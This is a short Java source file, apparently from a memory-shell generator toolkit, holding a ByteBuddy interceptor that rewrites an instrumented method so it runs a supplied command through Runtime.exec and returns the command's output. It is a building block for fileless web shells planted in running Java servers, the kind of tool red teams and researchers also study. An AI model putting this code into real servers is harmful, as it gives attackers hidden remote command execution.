package com.reajason.javaweb.memshell.generator.command;

import net.bytebuddy.asm.Advice;

import java.io.IOException;
import java.io.InputStream;

/**
 * @author ReaJason
 * @since 2025/5/25
 */
public class RuntimeExecInterceptor {
    @Advice.OnMethodExit
    public static void enter(@Advice.Argument(value = 0) String cmd, @Advice.Return(readOnly = false) InputStream returnValue) throws IOException {
        returnValue = Runtime.getRuntime().exec(cmd).getInputStream();
    }
}
